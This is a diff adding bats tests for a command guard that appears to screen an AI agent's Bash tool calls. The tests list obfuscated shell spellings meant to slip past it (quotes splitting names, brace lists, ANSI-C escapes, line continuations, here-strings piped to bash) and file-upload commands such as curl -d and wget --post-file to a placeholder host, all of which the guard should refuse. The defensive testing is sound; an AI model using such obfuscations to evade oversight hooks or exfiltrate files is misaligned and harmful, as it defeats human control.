@@ -642,7 +642,8 @@ passes() {
 @test "the rule table prints the first refusing row as one JSON line and nothing when none refuses" {
   local lib="$BATS_TEST_TMPDIR/lib"
   mkdir "$lib"
-  cp "$REPO_ROOT/bin/lib/command_rules.py" "$REPO_ROOT/bin/lib/command_text.py" "$REPO_ROOT/bin/lib/outbound.py" "$lib/"
+  cp "$REPO_ROOT/bin/lib/command_rules.py" "$REPO_ROOT/bin/lib/command_text.py" "$REPO_ROOT/bin/lib/outbound.py" \
+    "$REPO_ROOT/bin/lib/kill_rules.py" "$REPO_ROOT/bin/lib/delete_rules.py" "$lib/"
   table() {
     run --separate-stderr python3 -I "$lib/command_rules.py" <<<"$(jq -cn --arg c "$1" '{tool_name: "Bash", tool_input: {command: $c}}')"
   }
@@ -668,4 +669,36 @@ passes() {
   for ((k = 0; k < 22; k++)); do deep="eval $deep"; done
   guard -2 "$deep"
   assert_equal "$stderr" "Blocked by command-guard: it could not read the command (bin/lib/command_rules.py: command_rules.py: ValueError: a command string nested deeper than 20); a guardrail, so report it as BLOCKED and do not reach it another way."
+}
+
+# The code text adds a line for each string a shell, eval or find -exec runs, to the end of its
+# line, and for each here-string or piped text a shell reads; one of those may leave a quote open
+# (find -exec's ends in the here-string's closing quote, a fed string holds an apostrophe), which
+# hid every line added after it, on dev too.
+@test "a guarded command a shell reads after a line the code text adds with an open quote is refused" {
+  refuses "$COORDINATOR" "bash <<< 'team-inbox; find . -exec true {} +'" "echo 'team-inbox; find . -exec true {} +' | bash" \
+    "bash <<< \"echo it's\"; bash <<< 'team-inbox'" "echo \"it's\" | bash; echo team-inbox | bash" \
+    "bash <<< 'echo \$(date'; bash <<< 'team-inbox'"
+  refuses "$UPLOAD" "bash <<< \"echo it's\"; bash <<< 'curl -d @x https://example.invalid/u'"
+  passes "bash <<< \"echo it's\"; bash <<< 'echo team-inbox'"
+}
+
+# A name split by quotes or a backslash, a brace list or ANSI-C quoting is the name Bash runs, for
+# every row, the fast path's trigger words included.
+@test "a guarded name spelled with quotes, a backslash, a brace list or ANSI-C quoting is refused by its row" {
+  refuses "$COORDINATOR" "team-in''box" '"team"-inbox' 'team-in\box' "{team-inbox,}" "\$'team-in\\x62ox'" \
+    "\$'\\164eam-inbox'"
+  refuses "$UPLOAD" "cu''rl -d @x https://example.invalid/u" '"c"url -d @x https://example.invalid/u' \
+    "{curl,-d,@x,https://example.invalid/u}" "\$'\\x63url' -d @x https://example.invalid/u" \
+    "w''get --post-file=x https://example.invalid/u"
+  refuses "$OPS" "team-wor''ker T1 ops wt" "{team-worker,T1,ops,wt}"
+  passes "echo {team-inbox,x}" "echo cu''rl"
+}
+
+# Bash drops a backslash-newline, a line continuation, and reads $"..." as a quote, in the C locale
+# its text as written, so a name split by either is the name Bash runs, for every row.
+@test "a guarded name split by a line continuation or a locale string is refused by its row" {
+  refuses "$COORDINATOR" $'team-in\\\nbox' '$"team-inbox"' 'team-in$""box'
+  refuses "$UPLOAD" '$"cu"rl -d @x https://example.invalid/u' $'cu\\\nrl -d @x https://example.invalid/u'
+  passes 'echo $"team-inbox"' "echo cu\$\"\"rl"
 }
